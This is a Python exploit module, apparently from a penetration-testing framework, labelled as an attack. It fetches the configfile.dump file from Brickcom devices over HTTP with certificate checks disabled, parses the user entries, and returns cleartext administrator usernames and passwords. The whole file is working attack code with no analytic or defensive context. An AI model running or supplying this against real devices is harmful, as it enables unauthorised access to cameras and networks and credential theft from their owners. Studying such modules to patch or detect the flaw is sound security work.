import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "brickcom/config_disclosure_attack"
        self.description = "Exploit module to extract cleartext administrative credentials from Brickcom configuration files."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/configfile.dump?action=get"
        else:
            url = f"{target.rstrip('/')}/configfile.dump?action=get"
            
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                print("\033[1;33m[*] Téléchargement et analyse du fichier configfile.dump...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and ("UserSetSetting" in response.text or "password" in response.text.lower()):
                    lines = response.text.splitlines()
                    extracted_credentials = {}
                    
                    # Parcours du fichier pour lier dynamiquement les index d'utilisateurs à leurs identifiants
                    for line in lines:
                        line = line.strip()
                        if "UserSetSetting.userList.users" in line and "=" in line:
                            key, val = line.split("=", 1)
                            # Exemple de clé : UserSetSetting.userList.users0.username
                            # On isole l'index de l'utilisateur (ex: users0, users1)
                            parts = key.split(".")
                            user_index = parts[-2] if len(parts) >= 2 else "unknown"
                            prop = parts[-1]
                            
                            if user_index not in extracted_credentials:
                                extracted_credentials[user_index] = {"username": "N/A", "password": "N/A"}
                            
                            if prop == "username":
                                extracted_credentials[user_index]["username"] = val
                            elif prop == "password":
                                extracted_credentials[user_index]["password"] = val

                    # Formatage de la sortie finale pour affichage et sauvegarde
                    results_list = []
                    for idx, creds in extracted_credentials.items():
                        if creds["username"] != "N/A" or creds["password"] != "N/A":
                            results_list.append(f"{creds['username']}:{creds['password']}")
                    
                    if results_list:
                        return {
                            "success": True,
                            "details": f"Credentials extracted successfully: {' || '.join(results_list)}"
                        }
                    else:
                        return {"success": False, "details": "Configuration file leaked, but no specific user/password pattern matched."}
                        
        except Exception as e:
            return {"success": False, "error": str(e)}
            
        return {"success": False, "details": "Target device did not leak configuration metadata."}
